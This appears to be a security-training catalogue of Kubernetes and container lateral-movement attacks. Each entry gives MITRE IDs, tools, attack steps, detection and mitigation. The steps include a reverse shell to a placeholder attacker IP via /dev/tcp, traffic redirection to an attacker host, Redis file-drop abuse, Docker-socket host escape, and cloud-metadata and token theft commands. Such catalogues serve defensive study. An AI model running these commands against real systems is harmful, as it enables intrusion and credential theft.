## Public Docker Image with Hardcoded .npmrc

- **Attack Type**: Credentials in Image Layers
- **Target**: Docker Image
- **Vulnerability**: Hardcoded token in build files
- **MITRE**: T1552
- **Impact**: npm registry abuse, internal leakage
- **Tools**: npm CLI, DockerHub
- **Scenario**: .npmrc file with embedded npm token accidentally added to container layer.
- **Attack Steps**: 1. Developer includes .npmrc for internal package access in Docker build.\n2. File contains a private npm access token.\n3. It is never removed in later steps or .dockerignore.\n4. Image is uploaded to DockerHub.\n5. Attacker pulls image and retrieves .npmrc, gaining access to internal registries or publishing malicious packages under trusted scope.
- **Detection**: Scan image for auth files
- **Solution**: Remove credentials and enforce automated secret scans
- **Tags**: #npmrc #dockersecrets

## Internal Redis Enumeration via Container Scan

- **Attack Type**: Container-to-Container Network Scan
- **Target**: Container-to-Container
- **Vulnerability**: Redis service running without auth
- **MITRE**: T1046
- **Impact**: Access to sensitive cache and pivot points
- **Tools**: Nmap, Redis-CLI
- **Scenario**: Redis instance is running without auth and exposed to other containers.
- **Attack Steps**: 1. Attacker gains access to a compromised container.2. Runs nmap -p 6379 10.0.0.0/24 to scan for open Redis ports.3. Discovers unsecured Redis instance running in another container.4. Uses redis-cli from inside container to connect and run KEYS *, GET, SET.5. Sensitive data, configs or cache credentials are leaked.6. Attacker may overwrite data or drop malicious Lua scripts via Redis.
- **Detection**: Runtime container network monitoring
- **Solution**: Enforce Redis auth, firewall intra-cluster traffic
- **Tags**: #redis #networkscan #lateral

## MongoDB Enumeration via Sidecar Container

- **Attack Type**: Container-to-Container Enumeration
- **Target**: Kubernetes Pod Sidecar
- **Vulnerability**: No authentication on internal MongoDB
- **MITRE**: T1210
- **Impact**: Data theft and schema poisoning
- **Tools**: Mongo CLI, curl, Nmap
- **Scenario**: Sidecar container scans pod network and identifies open MongoDB without credentials.
- **Attack Steps**: 1. Attacker compromises logging sidecar container.2. Uses nmap -p 27017 127.0.0.0/8 to find open MongoDB service.3. Connects to mongo --host target-pod-ip.4. Database is open without username/password due to legacy config.5. Dumps customer records and inserts malicious schema.6. Escalates control of the application or causes data poisoning.
- **Detection**: MongoDB access logs, pod traffic analysis
- **Solution**: Enforce MongoDB auth, disable wildcard network exposure
- **Tags**: #mongodb #sidecar #nosql

## Exploiting .svc.cluster.local via SSRF

- **Attack Type**: Internal DNS Abuse
- **Target**: Kubernetes Services
- **Vulnerability**: SSRF via trusted internal DNS
- **MITRE**: T1212
- **Impact**: Internal service pivot, SSRF compromise
- **Tools**: curl, dig, Burp Suite
- **Scenario**: Target microservices via Kubernetes DNS inside the cluster for SSRF pivoting.
- **Attack Steps**: 1. App running inside container allows unsanitized curl or SSRF-style endpoints.2. Attacker crafts URL: http://internal-service.svc.cluster.local/health or metadata path.3. Performs SSRF to other microservices, exposing their internals.4. Sensitive APIs are hit via GET /config, POST /internal-token, etc.5. Gathers internal IPs, tokens or environment variables.6. Attack may be chained to further RCE or token abuse.
- **Detection**: Ingress logs, DNS resolution trails
- **Solution**: Block SSRF via input sanitization + service network segmentation
- **Tags**: #ssrf #svcclusterlocal #internalpivot

## Accessing AWS Metadata API from Compromised Pod

- **Attack Type**: Cloud Metadata Abuse
- **Target**: Cloud Instance from Pod
- **Vulnerability**: Open metadata endpoint in container
- **MITRE**: T1552.004
- **Impact**: Cloud-wide compromise via IAM creds
- **Tools**: curl, AWS CLI
- **Scenario**: Attacker accesses http://169.254.169.254 from within a pod to extract AWS IAM role credentials.
- **Attack Steps**: 1. Container is running in EKS with IAM roles for service account.2. Attacker gets shell access in container.3. Executes curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name.4. Retrieves temporary IAM credentials.5. Uses AWS CLI to access S3, Lambda, and other AWS APIs.6. Laterally moves into other AWS services.7. Blue Team unaware as access looks legitimate.
- **Detection**: VPC logs, audit logs, unusual IP behavior
- **Solution**: Enforce IMDSv2, block metadata access from pods
- **Tags**: #aws #metadata #iamabuse

## Brute-forcing Internal Elasticsearch Service

- **Attack Type**: No-Auth Elasticsearch Pivot
- **Target**: Internal Data Cluster
- **Vulnerability**: No security on Elasticsearch access
- **MITRE**: T1046
- **Impact**: Sensitive data exfil, data destruction
- **Tools**: curl, Nmap, elasticdump
- **Scenario**: Container attacker scans and brute-forces an unsecured Elasticsearch instance on internal network.
- **Attack Steps**: 1. From compromised container, attacker runs nmap -p 9200 10.0.0.0/16.2. Finds Elasticsearch pod with no authentication.3. Executes curl http://pod-ip:9200/_cat/indices?v to list data.4. Uses elasticdump to download indices such as logs, PII, API keys.5. May insert manipulated data or delete indices.6. Exploits elasticsearch plugins or scripts if enabled.
- **Detection**: Elasticsearch logs, pod egress monitor
- **Solution**: Require auth + use mutual TLS for Elasticsearch
- **Tags**: #elasticsearch #internalscan

## Misconfigured Container Allows Host Discovery

- **Attack Type**: Host Discovery via /etc/hosts & Tools
- **Target**: Kubernetes Pod
- **Vulnerability**: Privileged container with network tools
- **MITRE**: T1087.002
- **Impact**: Recon + lateral foothold
- **Tools**: nmap, dig, netstat
- **Scenario**: Misconfigured container has host utilities; attacker uses them to enumerate internal services and nodes.
- **Attack Steps**: 1. Container is overly permissive and includes tools like nmap, netstat, dig.2. Attacker uses dig svc.cluster.local to find service domains.3. Runs netstat -tunlp to discover open ports inside container.4. Discovers DNS-resolvable pod/service names via /etc/hosts injection.5. Begins lateral exploration using discovered IPs and ports.6. May exploit known services or default creds.
- **Detection**: Process tree + anomaly alerting
- **Solution**: Use distroless containers, remove recon tools
- **Tags**: #dig #netstat #hostdiscovery

## Using Internal Load Balancer for Pivot

- **Attack Type**: East-West Traffic Abuse
- **Target**: Internal Load Balancer
- **Vulnerability**: East-West unrestricted traffic
- **MITRE**: T1071.001
- **Impact**: Unrestricted internal service traversal
- **Tools**: curl, telnet
- **Scenario**: Compromised container abuses internal LB to reach restricted apps without public access.
- **Attack Steps**: 1. Internal Load Balancer (ILB) in Kubernetes exposes microservices to internal network only.2. Attacker inside compromised pod uses curl ilb-service:8080/api.3. Accesses applications not exposed externally.4. Sends SSRF, enumeration, or command payloads.5. Potentially reaches backend DBs, APIs with no rate limiting or security.6. Exploits privilege escalation or secrets within backend response.
- **Detection**: Internal traffic inspection
- **Solution**: Isolate ILBs to only trusted namespaces
- **Tags**: #ilb #eastwest #internalpivot

## Pivoting via Compromised Sidecar Container

- **Attack Type**: Sidecar Abuse for Recon & Movement
- **Target**: Logging Sidecar
- **Vulnerability**: Over-privileged containers, no egress limit
- **MITRE**: T1071.001
- **Impact**: Recon, internal compromise
- **Tools**: BusyBox, nmap, ssh, netcat
- **Scenario**: Attacker exploits logging sidecar to map internal network and pivot to other containers.
- **Attack Steps**: 1. Sidecar container has bash and utilities installed.2. Attacker uses nmap or netcat to discover live services.3. Connects to internal endpoints on other containers: MySQL, Redis, etc.4. Dumps credentials or steals sessions from logs.5. Deploys scripts that send pings to internal services.6. If SSH or RPC is open, attacker moves laterally to sibling containers.
- **Detection**: Inter-container egress logs
- **Solution**: Harden sidecars, strip tools, enforce egress controls
- **Tags**: #sidecarabuse #recon #pivot

## SSRF from Container to GCP Metadata API

- **Attack Type**: GCP Metadata Exploit via SSRF
- **Target**: Container App (GCP)
- **Vulnerability**: SSRF to internal metadata
- **MITRE**: T1552.004
- **Impact**: Full GCP access via SSRF token theft
- **Tools**: curl, GCP CLI
- **Scenario**: SSRF vulnerability in a container app lets attacker hit GCP metadata API for tokens.
- **Attack Steps**: 1. App allows user-supplied URL in fetch function (GET ?url=http://...).2. Attacker supplies: http://metadata.google.internal/computeMetadata/v1/ with header Metadata-Flavor: Google.3. App makes internal request to metadata API.4. Response contains service account token.5. Token is used to access GCP APIs (storage, PubSub, etc.).6. Attacker may persist or pivot across GCP services.
- **Detection**: SSRF pattern matching in logs
- **Solution**: SSRF filter + restrict metadata endpoint access via firewall
- **Tags**: #gcp #metadata #ssrf

## Lateral Move via K8s Token in Environment

- **Attack Type**: K8s Token Theft
- **Target**: Kubernetes Pod
- **Vulnerability**: Auto-mounted tokens with excess RBAC
- **MITRE**: T1552.001
- **Impact**: Cluster-wide escalation via stolen token
- **Tools**: bash, curl, kubectl
- **Scenario**: Pod’s service account token is available in /var/run/secrets and used for further pivoting.
- **Attack Steps**: 1. Pod has default service account token auto-mounted.2. Attacker compromises pod and reads /var/run/secrets/kubernetes.io/serviceaccount/token.3. Uses kubectl --token to call Kubernetes API.4. Lists pods, services, secrets across other namespaces.5. Accesses K8s APIs for exec, logs, or configmaps.6. If RBAC allows, attacker gains persistence or extracts secrets.
- **Detection**: Audit API usage per token ID
- **Solution**: Disable token mount or bind minimal RBAC
- **Tags**: #rbac #k8stoken #pivot

## Lateral Movement via Unsecured gRPC Microservice

- **Attack Type**: Container-to-Container RPC Misuse
- **Target**: Internal Microservice
- **Vulnerability**: Unauthenticated internal gRPC service
- **MITRE**: T1021.002
- **Impact**: Sensitive info leakage and pivot path
- **Tools**: grpcurl, Nmap
- **Scenario**: An attacker scans and calls unsecured gRPC services within the same namespace using predictable service names.
- **Attack Steps**: 1. The attacker gains access to a compromised container in a Kubernetes pod.2. They run an internal network scan using nmap -p 50051 10.0.0.0/16 to detect open gRPC ports.3. Discovering a microservice running on 50051, they use grpcurl to probe available methods: grpcurl pod-ip:50051 list.4. The gRPC service lacks TLS or auth, allowing function calls.5. Attacker invokes sensitive RPC functions like GetUserSecrets or AdminResetPassword.6. Uses information to pivot to another internal app or obtain valid credentials for further lateral access.
- **Detection**: Container network logging + audit RPC calls
- **Solution**: Enforce mTLS and auth on internal RPC calls
- **Tags**: #grpc #rpc #microservices

## Pod Breakout to Internal API Gateway via SSRF

- **Attack Type**: SSRF via Internal DNS
- **Target**: Internal API Gateway
- **Vulnerability**: SSRF with access to internal DNS
- **MITRE**: T1212
- **Impact**: Internal API exposure via user input
- **Tools**: curl, Burp Suite
- **Scenario**: SSRF in a containerized app allows reaching internal API gateway over cluster DNS.
- **Attack Steps**: 1. Application inside a container processes user-supplied URLs (e.g., image fetcher).2. The input is not properly validated.3. Attacker sends a URL pointing to http://internal-api.svc.cluster.local/v1/secrets.4. The containerized app makes an SSRF request to internal K8s service.5. Secrets, tokens, or sensitive API responses are returned in app response.6. Attacker uses this data to compromise backend apps or escalate permissions.7. Escalation is silent unless deep application logging is enabled.
- **Detection**: Application logs with full URL requests
- **Solution**: Block SSRF endpoints, add allow-list, restrict internal DNS access
- **Tags**: #ssrf #svccluster #gatewayaccess

## Privilege Escalation via Metadata Token in Container

- **Attack Type**: Cloud Metadata Abuse
- **Target**: AWS EKS Container
- **Vulnerability**: Open access to metadata endpoint
- **MITRE**: T1552.004
- **Impact**: Cloud privilege escalation via stolen token
- **Tools**: curl, AWS CLI
- **Scenario**: AWS metadata API is accessed from container to retrieve IAM role credentials.
- **Attack Steps**: 1. Container is running in EKS with EC2 instance metadata enabled.2. The attacker uses curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name.3. Receives JSON response with temporary AWS access keys.4. Configures AWS CLI with stolen keys.5. Uses aws s3 ls, aws ec2 describe-instances, or aws iam list-users to enumerate resources.6. Data is exfiltrated or used to launch further attacks in AWS.7. No alerts triggered unless API usage anomaly detection is active.
- **Detection**: CloudTrail logs, VPC Flow Logs
- **Solution**: Enforce IMDSv2, restrict access via firewall and iptables
- **Tags**: #aws #iam #metadata

## Pivoting via Unsecured Elasticsearch Inside Pod

- **Attack Type**: Lateral via Unprotected Cluster Database
- **Target**: ElasticSearch Pod
- **Vulnerability**: Open Elasticsearch instance in-cluster
- **MITRE**: T1046
- **Impact**: Data exfiltration, manipulation
- **Tools**: curl, elasticdump
- **Scenario**: Container-to-container movement via unsecured Elasticsearch with default open port.
- **Attack Steps**: 1. Attacker gains shell inside a container in the same namespace as an Elasticsearch pod.2. Uses curl http://elasticsearch.svc.cluster.local:9200/_cat/indices to list available indices.3. Identifies logging data, user information, and system configs.4. Runs elasticdump to exfiltrate selected indices to external storage.5. May inject fake logs or malicious data.6. Attack goes unnoticed unless Elasticsearch access logging is enabled.7. Attacker achieves full observability of internal workloads.
- **Detection**: Elasticsearch audit logs
- **Solution**: Require auth, restrict to trusted IPs, enable audit trail
- **Tags**: #elasticsearch #datadump #podpivot

## Compromised Container Runs Network Scan on Internal Pods

- **Attack Type**: Container Recon and Port Scanning
- **Target**: Kubernetes Pods
- **Vulnerability**: No egress control between pods
- **MITRE**: T1046
- **Impact**: Full service map of the cluster
- **Tools**: Nmap, netcat
- **Scenario**: Attacker runs nmap inside a compromised container to identify live services on other pods.
- **Attack Steps**: 1. Attacker compromises a container with full Bash access.2. Installs or already has nmap or netcat.3. Runs nmap -sS -p 80,443,3306 10.0.0.0/16.4. Discovers web servers, MySQL databases running on sibling pods.5. Performs banner grabbing or test HTTP routes.6. Logs service behaviors and fingerprint versions for known vulnerabilities.7. Uses data to plan targeted exploitation.8. Movement occurs silently unless egress rules or IDS are enforced at pod-level.
- **Detection**: Pod-to-pod traffic monitoring
- **Solution**: Apply egress policies and restrict intra-cluster communication
- **Tags**: #nmap #recon #lateral

## Exploiting SSRF via .svc.cluster.local Path

- **Attack Type**: SSRF via Internal DNS Mapping
- **Target**: Kubernetes Internal DNS
- **Vulnerability**: SSRF to internal service DNS
- **MITRE**: T1212
- **Impact**: Access restricted cluster resources
- **Tools**: curl, Burp Suite
- **Scenario**: SSRF misuses Kubernetes service names to reach unintended pods and services.
- **Attack Steps**: 1. App offers a user-input-driven HTTP client (e.g., "Check URL" feature).2. Attacker inputs URL http://db-internal.svc.cluster.local/admin.3. Application resolves the service name and makes HTTP call.4. Internal admin interface is accessible only inside the cluster, but SSRF bridges that gap.5. Attacker extracts config data, environment variables, or even resets admin password.6. May use this data to pivot to adjacent microservices or backend apps.7. All from an external interface with no shell access.
- **Detection**: Application logs, outbound request filtering
- **Solution**: Apply SSRF filtering, allow-list URLs, restrict internal service DNS
- **Tags**: #ssrf #internaldns #svccluster

## Docker Container Fetches GCP Token via Metadata API

- **Attack Type**: Metadata Token Harvesting (GCP)
- **Target**: GCP Container Instance
- **Vulnerability**: SSRF + Open metadata access
- **MITRE**: T1552.004
- **Impact**: Access to cloud services using stolen token
- **Tools**: curl, gcloud
- **Scenario**: App SSRF lets attacker fetch GCP metadata token and access GCP APIs.
- **Attack Steps**: 1. Attacker identifies SSRF in app’s /fetch?url=... endpoint.2. Supplies internal GCP metadata endpoint URL: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token.3. App server makes request and responds with JSON containing access token.4. Attacker configures gcloud auth activate-refresh-token to use token.5. Lists buckets, projects, users using GCP CLI.6. Attack is difficult to detect due to use of internal APIs.
- **Detection**: Audit metadata requests
- **Solution**: Enable metadata protection, enforce metadata-flavor headers
- **Tags**: #gcp #metadata #tokenleak

## Container Accesses Internal Redis via Misused DNS Lookup

- **Attack Type**: DNS Abuse + Misconfigured Redis
- **Target**: Redis Instance
- **Vulnerability**: No password & open internal access
- **MITRE**: T1210
- **Impact**: Application logic disruption + data leak
- **Tools**: redis-cli, dig, nmap
- **Scenario**: DNS-based access to Redis using Kubernetes service name enables data extraction.
- **Attack Steps**: 1. Redis is deployed with a ClusterIP service named redis-db.svc.cluster.local.2. Attacker resolves it using dig redis-db.svc.cluster.local.3. Uses redis-cli -h redis-db.svc.cluster.local to connect.4. Since requirepass is not set, attacker lists keys with KEYS *.5. Dumps session data, access tokens, or app cache.6. Modifies keys to cause logic errors in application behavior.7. Exploit is unnoticed without access logs or Redis security configuration.
- **Detection**: Redis command logging
- **Solution**: Set requirepass, restrict pod access, use auth ACLs
- **Tags**: #redis #dnsabuse #internalpivot

## Kubernetes Token Auto-Mounted in Container Exploited

- **Attack Type**: Kubernetes Token Theft
- **Target**: Kubernetes Cluster
- **Vulnerability**: Auto-mounted high-privilege token
- **MITRE**: T1552.001
- **Impact**: Cluster enumeration + privilege escalation
- **Tools**: bash, kubectl, curl
- **Scenario**: Auto-mounted service account token in pod used for unauthorized API access.
- **Attack Steps**: 1. Kubernetes by default mounts a service account token into /var/run/secrets/... inside pods.2. Attacker in compromised pod reads token using cat.3. Uses kubectl --token or curl to call K8s API: GET /api/v1/namespaces/default/pods.4. Enumerates services, secrets, configMaps.5. If RBAC is lax, may use exec or modify deployments.6. No external connection required — full access is from within pod.7. Attack path depends on role binding permissions granted to pod.
- **Detection**: K8s API audit logs, role usage logs
- **Solution**: Use automountServiceAccountToken: false, apply least-privileged RBAC
- **Tags**: #k8s #tokenabuse #internalpivot

## Sidecar Container Used for Reverse Proxy to Other Pods

- **Attack Type**: Sidecar as Proxy Tunnel
- **Target**: Kubernetes Pod (Sidecar)
- **Vulnerability**: No restriction on sidecar egress
- **MITRE**: T1090
- **Impact**: Covert access to internal cluster traffic
- **Tools**: socat, netcat, Python
- **Scenario**: Malicious code in sidecar listens on HTTP and proxies traffic to internal pods.
- **Attack Steps**: 1. A malicious sidecar is deployed alongside legitimate service pods.2. It exposes a reverse proxy via socat TCP-LISTEN:8080,fork TCP:target-svc:80.3. External attacker connects to proxy and sends HTTP requests which are forwarded to internal services.4. This bypasses ingress controls and firewall rules.5. Attacker accesses internal APIs, config endpoints, and services.6. Blue team has no visibility unless sidecar traffic is being logged.7. Can be used to tunnel into otherwise protected workloads.
- **Detection**: Monitor sidecar behavior, unexpected traffic
- **Solution**: Block unauthorized sidecar containers, monitor reverse proxy setups
- **Tags**: #sidecarproxy #lateralmove #socat

## Reverse Shell via Misconfigured Internal Admin Panel

- **Attack Type**: Container Lateral Access via Panel RCE
- **Target**: Admin-enabled Web Pod
- **Vulnerability**: Command injection panel in internal web UI
- **MITRE**: T1059.003
- **Impact**: Full container takeover + lateral recon
- **Tools**: curl, nc, Burp Suite
- **Scenario**: Exploit an exposed admin panel in a container to launch a reverse shell into the attacker’s system.
- **Attack Steps**: 1. Attacker first gains shell into a web container through a weak admin login panel using default creds (admin:admin).2. They explore the admin panel and find a "System Command" debug feature exposed on /admin/debug?cmd= endpoint.3. Attacker sets up a listener on their system using nc -lvnp 4444.4. Sends a command injection payload via browser or curl: curl "http://target/admin/debug?cmd=bash -i >& /dev/tcp/attacker-ip/4444 0>&1".5. Reverse shell connects back to attacker.6. From this shell, attacker enumerates internal networks and mounted secrets, and uses it to pivot to adjacent containers.7. Privilege escalation attempts follow by accessing hostPath or Docker socket if available.
- **Detection**: Reverse shell traces (if logged), audit logs
- **Solution**: Sanitize inputs in admin panels, disable prod debug features
- **Tags**: #rce #debugpanel #reverse_shell

## Exploiting Cluster DNS to Locate No-Auth MongoDB Instance

- **Attack Type**: Internal Service Enumeration via DNS
- **Target**: MongoDB Pod
- **Vulnerability**: No authentication and exposed in-cluster
- **MITRE**: T1210
- **Impact**: Data dump and lateral movement via DB
- **Tools**: dig, mongo-cli, nmap
- **Scenario**: Use Kubernetes DNS to find internal DBs with no authentication.
- **Attack Steps**: 1. Attacker inside compromised container uses internal DNS to enumerate likely service names like mongo, mongodb, db-service.2. Uses dig mongo.svc.cluster.local and confirms resolution to internal IP.3. Attempts connection using mongo --host mongo.svc.cluster.local.4. The MongoDB pod has no auth: true set and allows anonymous access.5. Attacker lists databases using show dbs, reads from collections, and dumps sensitive user data.6. May drop malicious JS functions or create new users to retain access.7. Uses access to extract tokens, session data, and possibly lateral access credentials to other pods or cloud accounts.
- **Detection**: Mongo logs (if logging enabled)
- **Solution**: Enable auth: true, restrict access using NetworkPolicies
- **Tags**: #mongodb #dnsrecon #noauthdb

## Leveraging JWT from Logs to Access Internal APIs

- **Attack Type**: Token Replay from Log Leak
- **Target**: Internal Microservices
- **Vulnerability**: JWT token leaked in logs
- **MITRE**: T1552.001
- **Impact**: Access internal services using reused token
- **Tools**: jwt-tool, curl, log4shell
- **Scenario**: Attacker reuses JWT tokens leaked in app logs to call internal APIs.
- **Attack Steps**: 1. App running inside a container logs full HTTP headers including Authorization: Bearer <JWT> due to verbose debug logging.2. Attacker gains container shell and inspects /var/log/app.log.3. Extracts a recent JWT and verifies its validity using jwt-tool or online decoders.4. Reuses JWT to send requests to protected endpoints in other microservices: curl -H "Authorization: Bearer <token>" http://internal-api.svc.local/user-data.5. If no expiry or revocation mechanism is in place, attacker gets full access.6. Can perform POST operations or modify state in downstream services.7. Attack goes unnoticed unless token usage is monitored or logs are sanitized.
- **Detection**: App logs + JWT validation systems
- **Solution**: Never log Authorization headers, auto-expire tokens fast
- **Tags**: #jwt #logleak #tokenreuse

## Sidecar Malware Redirecting Traffic to Malicious Host

- **Attack Type**: Sidecar-Based MITM Redirection
- **Target**: Pod with Sidecar
- **Vulnerability**: No integrity check on injected sidecars
- **MITRE**: T1040
- **Impact**: Full data exfiltration via transparent proxy
- **Tools**: iptables, socat, tcpdump
- **Scenario**: A malicious sidecar container silently proxies outbound traffic to attacker-controlled server.
- **Attack Steps**: 1. Attacker deploys a malicious sidecar alongside a legitimate microservice in a shared pod.2. Sidecar modifies iptables rules to redirect all outbound HTTP traffic to attacker IP: iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination attacker-ip:8080.3. It proxies this traffic using socat or a custom MITM server.4. Sensitive data such as API keys, session tokens, and internal service responses are silently exfiltrated.5. The app continues to function normally, so the breach remains undetected.6. Attacker logs all intercepted data.7. Can also inject malicious content into returned responses if required.
- **Detection**: Network traffic anomaly, sidecar diffing
- **Solution**: Restrict sidecar additions, use admission controllers with signatures
- **Tags**: #sidecar #mitm #containerproxy

## Container Network Mapping via ARP Cache Inspection

- **Attack Type**: Passive Reconnaissance of Internal Network
- **Target**: Container Pod
- **Vulnerability**: Lack of isolation between pod ARP tables
- **MITRE**: T1046
- **Impact**: Stealthy service discovery and enumeration
- **Tools**: arp, ip, bash
- **Scenario**: Reading ARP cache reveals IPs of peer containers and services.
- **Attack Steps**: 1. Inside a running container, attacker executes arp -a or ip neigh to view the Address Resolution Protocol (ARP) table.2. The ARP cache lists IPs of nearby pods that have recently communicated on the network.3. Attacker cross-references these IPs using nmap or curl to identify services (e.g., nmap -sV 10.0.1.15).4. Builds an internal service map without triggering scanning alerts (passive observation).5. Uses this map to attempt SSRF, command injection, or unauthorized access to other containers or services.6. This method is stealthier than active scans.7. Attacker can maintain persistence and plan targeted lateral movement.
- **Detection**: ARP table access in restricted containers
- **Solution**: Harden container netns, restrict CAP_NET_RAW
- **Tags**: #arp #recon #container_enum

## Metadata API Abuse via SSRF in Curl Command Parameter

- **Attack Type**: SSRF to Cloud Metadata in CI Job
- **Target**: CI/CD Container
- **Vulnerability**: SSRF to internal metadata with token access
- **MITRE**: T1552.004
- **Impact**: Cloud account takeover from CI container
- **Tools**: curl, aws-cli, gcloud
- **Scenario**: SSRF via user-supplied curl param fetches cloud credentials inside container.
- **Attack Steps**: 1. A containerized CI/CD pipeline runs a build script that accepts user-supplied URLs to validate content: curl $URL.2. Attacker submits payload URL pointing to cloud metadata service: http://169.254.169.254/latest/meta-data/iam/security-credentials/role.3. The script runs inside container with access to instance metadata.4. This fetches access tokens for AWS/GCP, which are printed in logs or stored in artifacts.5. Attacker uses aws configure or gcloud auth to assume cloud identity.6. May spin new instances, access buckets, or create IAM users.7. Exploit is hard to detect if metadata headers are not enforced.
- **Detection**: CloudTrail/API logs (if enabled)
- **Solution**: Block metadata IPs, require IMDSv2, validate URLs
- **Tags**: #ssrf #ciabuse #cloudtokenleak

## Redis with No AUTH Accessed from Neighboring Container

- **Attack Type**: Redis Unauthorized Access + Command Abuse
- **Target**: Redis Pod
- **Vulnerability**: No auth, exposed to peer containers
- **MITRE**: T1210
- **Impact**: Remote code execution via DB abuse
- **Tools**: redis-cli, netcat
- **Scenario**: Internal Redis instance allows unauthenticated config changes from container peer.
- **Attack Steps**: 1. Attacker in container executes redis-cli -h redis.svc.cluster.local.2. Redis accepts connection without requirepass set.3. Runs CONFIG SET dir /tmp && CONFIG SET dbfilename evil.sh.4. Executes SET payload "<reverse_shell_payload>" followed by SAVE to write a file to /tmp.5. Payload is picked up by cron or another exposed process.6. Redis is abused as a file dropper due to insecure config.7. Attacker achieves code execution or persistent access inside the Redis host environment.
- **Detection**: Redis logs, pod-to-pod firewall
- **Solution**: Require password, restrict network access, monitor unusual CONFIG use
- **Tags**: #redisrce #unauthdb #internalrce

## Kubelet Port 10250 Accessed via Lateral Pivot

- **Attack Type**: Kubelet Exploitation via Open Port
- **Target**: Kubernetes Worker Node
- **Vulnerability**: Exposed unauthenticated Kubelet port
- **MITRE**: T1525
- **Impact**: Remote command execution on node pod
- **Tools**: curl, kubectl
- **Scenario**: Accessing unauthenticated Kubelet port allows command execution.
- **Attack Steps**: 1. Attacker compromises a container in the cluster.2. Scans network and identifies a Kubelet on https://10.0.2.15:10250.3. Sends GET request to /pods and /run, which are unauthenticated.4. If API allows it, attacker uses curl -k -X POST "https://<ip>:10250/run?cmd=bash" to run commands in pod.5. Gets shell or fetches logs/configs.6. This provides direct interaction with pods from a single exposed endpoint.7. The Kubelet server may also reveal node logs, metrics, and status details.
- **Detection**: VPC Flow Logs, kubelet access logs
- **Solution**: Disable unauthenticated ports, enforce mTLS, IP whitelisting
- **Tags**: #kubelet #rce #port10250

## Docker Daemon Socket Bound Over TCP without Auth

- **Attack Type**: Remote Docker Daemon Exploitation
- **Target**: Docker Host
- **Vulnerability**: Open, unauthenticated Docker socket
- **MITRE**: T1068
- **Impact**: Full container escape and host takeover
- **Tools**: docker, curl, socket.io
- **Scenario**: An exposed Docker daemon on port 2375 allows remote container creation.
- **Attack Steps**: 1. Attacker identifies that the Docker host has TCP socket enabled (-H tcp://0.0.0.0:2375).2. From container, connects using docker -H tcp://dockerhost:2375 ps.3. Lists and inspects containers running on host.4. Runs docker run -v /:/mnt --rm -it alpine chroot /mnt to gain full host shell.5. Exfiltrates host files, credentials, and modifies Docker images.6. Deploys malicious containers for persistence.7. Full host compromise achieved without privilege escalation inside initial container.
- **Detection**: Docker logs, unusual remote creation
- **Solution**: Never expose Docker socket over TCP or require TLS & auth
- **Tags**: #dockersocket #hostescape #daemonexposure

## Token Theft via Environment Dump in Container

- **Attack Type**: Env Variable Scraping
- **Target**: Any Container
- **Vulnerability**: Secrets exposed via environment variables
- **MITRE**: T1552.001
- **Impact**: Unauthorized access to external services
- **Tools**: env, strings, grep
- **Scenario**: Access tokens and credentials are exposed in environment variables.
- **Attack Steps**: 1. Attacker gets container shell (via SSRF or compromised volume).2. Runs env or inspects /proc/self/environ.3. Finds sensitive variables like AWS_ACCESS_KEY, DB_PASSWORD, or GITHUB_TOKEN.4. Uses grep and strings to extract credentials from memory or shell.5. Attempts to use them to access external services (e.g., aws s3 ls, curl -H with token).6. If CI/CD secrets are injected via env at runtime, this becomes a powerful method for post-exploitation.7. Attackers can escalate beyond container boundary using stolen credentials.
- **Detection**: Container logs, env export events
- **Solution**: Use secret mounts, not env vars; clear memory after use
- **Tags**: #envdump #tokenleak #containercreds

## Accessing Cloud Metadata API from Compromised Pod

- **Attack Type**: Metadata Service Exploitation
- **Target**: Cloud-Based Container
- **Vulnerability**: Metadata API exposed to container
- **MITRE**: T1552.004
- **Impact**: Cloud account takeover from within container
- **Tools**: curl, aws-cli, gcloud
- **Scenario**: Attacker accesses 169.254.169.254 metadata service from within a compromised container.
- **Attack Steps**: 1. Attacker gains access to a running container via misconfiguration or remote exploit.2. Inside the container, attacker identifies cloud environment (e.g., AWS) via instance hints like /sys/devices/virtual/dmi/id/board_vendor.3. Executes curl http://169.254.169.254/latest/meta-data/ to explore metadata.4. Retrieves IAM role credentials using curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME.5. Uses aws configure to set environment and aws sts get-caller-identity to confirm access.6. Executes operations like aws s3 ls, aws ec2 describe-instances, or gcloud compute instances list.7. Escalates privileges by spawning cloud resources, setting new IAM users, or creating persistence.
- **Detection**: VPC flow logs, CloudTrail, metadata API hits
- **Solution**: Enforce IMDSv2 (AWS), block metadata IPs, use workload identity tokens
- **Tags**: #metadataapi #cloudpivot #iamabuse

## Lateral Movement Using SSH Key Found in Mounted Volume

- **Attack Type**: SSH Key Reuse from Shared Volume
- **Target**: Shared-Mount Container
- **Vulnerability**: Developer secrets mounted insecurely
- **MITRE**: T1552.004
- **Impact**: Lateral SSH access using trusted key
- **Tools**: ssh, grep, mount, bash
- **Scenario**: SSH private key mounted into container is reused to pivot into other systems.
- **Attack Steps**: 1. Container mounts /opt/shared/keys directory from host where developers left SSH keys.2. Attacker explores /opt/shared/keys/id_rsa inside container.3. Uses grep to find usernames or IPs associated with key.4. Tests key on nearby hosts: ssh -i id_rsa user@10.0.2.15.5. Gains SSH access to internal staging servers or peer containers using same key.6. Once inside, attacker continues pivoting, dumping configs, and moving laterally.7. Since keys are reused across environments, attacker may access prod unintentionally.8. The SSH activity blends in unless unusual IP triggers alert.
- **Detection**: SSH logs on target host
- **Solution**: Never mount sensitive keys to containers, rotate keys regularly
- **Tags**: #sshkeyleak #volumemount #lateralpivot

## Enumerating and Exploiting Prometheus via Internal Access

- **Attack Type**: Internal Monitoring Tool Abuse
- **Target**: Prometheus Pod
- **Vulnerability**: Unauthenticated internal monitoring exposed
- **MITRE**: T1213
- **Impact**: Intelligence gathering for attack planning
- **Tools**: curl, promQL, browser
- **Scenario**: Prometheus dashboard exposed on internal port is accessed and queried by attacker.
- **Attack Steps**: 1. Compromised container runs netstat -tulpn or nmap to find open internal services.2. Prometheus found at http://prometheus.svc.cluster.local:9090/.3. Attacker queries /api/v1/targets and /api/v1/series to map monitored services.4. Extracts labels and metadata that reveal container names, IPs, open ports, pod names.5. Explores query features using PromQL to track memory/cpu of sensitive services.6. No authentication on Prometheus makes it a goldmine of internal observability data.7. Attacker uses insights to plan resource exhaustion or target high-value pods (e.g., DB pods with spikes).
- **Detection**: Internal service access logs
- **Solution**: Use auth proxy on dashboards, IP allowlist
